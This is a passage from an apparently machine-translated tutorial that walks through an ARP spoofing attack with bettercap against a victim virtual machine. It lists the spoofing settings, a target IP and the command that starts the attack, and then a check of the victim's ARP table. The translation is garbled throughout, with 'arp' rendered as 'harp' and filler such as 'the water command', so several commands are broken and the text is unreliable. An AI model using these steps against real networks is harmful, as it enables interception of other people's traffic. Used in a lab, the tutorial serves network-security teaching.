...
13. If it is not established "https://www.bettercap.org/installation /"s website says how to install.
...
17. **harp.we are seeing the spoof** module. And to examine the arp spoof module "**help arp.we are entering the command "spoof**".
The harp.commands in the spoof module "https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof /" you can review the commands by going to the link.

18. We'll make the attack, let's write the commands ;

``` bash
set harp.spoof.fullduplex true
```

Then we enter the water command.
``` bash
set harp.spoof.internal true
```

And finally, we state our goal.
``` bash
set harp.spoof.target TARGET_IP #192.168.237.133
```

Now we can launch the Harp spoofing attack. enter the water command to start ;
``` bash
the harp.spoof on
```

19. Our harp spoofing attack is taking place. Go to the virtual machine installed as a victim and type the water command on the **cmd** screen.
``` shell
arp -a
```
...
<h3>Dear Readers,</h3>
<h4>I hope this article will help you inform and inspire your readers about ARP Spoofing and network security issues.</h4>